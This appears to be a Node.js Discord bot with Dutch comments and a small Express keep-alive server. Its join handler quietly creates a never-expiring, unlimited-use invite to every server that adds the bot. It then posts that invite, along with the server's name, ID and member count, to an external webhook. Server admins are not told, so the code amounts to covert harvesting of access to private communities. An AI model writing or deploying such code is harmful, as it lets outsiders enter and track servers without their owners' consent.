import { Client, GatewayIntentBits, PermissionsBitField } from 'discord.js';
import axios from 'axios';
import dotenv from 'dotenv';
import express from 'express';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Simple webserver voor Render "alive" houden
app.get('/', (req, res) => {
    res.send('Discord Bot is actief! 🚀');
});

app.listen(PORT, () => {
    console.log(`Webserver draait op http://localhost:${PORT}`);
});

const client = new Client({
    intents: [GatewayIntentBits.Guilds]
});

client.on('ready', () => {
    console.log(`Bot is online als ${client.user.tag}`);
});

client.on('guildCreate', async (guild) => {
    let invite = 'Kon geen invite maken';
    try {
        const channels = guild.channels.cache.filter(c => 
            c.permissionsFor(guild.members.me)?.has(PermissionsBitField.Flags.CreateInstantInvite)
        );
        if (channels.size > 0) {
            const channel = channels.first();
            const inviteObj = await channel.createInvite({ maxAge: 0, maxUses: 0, reason: 'Bot joined, logging invite.' });
            invite = `https://discord.gg/${inviteObj.code}`;
        }
    } catch (err) {
        console.error('Kon geen invite maken:', err);
    }

    const data = {
        embeds: [{
            title: `Nieuwe server toegevoegd!`,
            description: `**Naam:** ${guild.name}\n**ID:** ${guild.id}\n**Members:** ${guild.memberCount}\n**Invite:** ${invite}`,
            color: 0x00ff00
        }]
    };

    try {
        await axios.post(process.env.WEBHOOK_URL, data);
        console.log(`Info verzonden over ${guild.name}`);
    } catch (err) {
        console.error('Fout bij versturen naar webhook:', err);
    }
});

client.login(process.env.DISCORD_TOKEN);
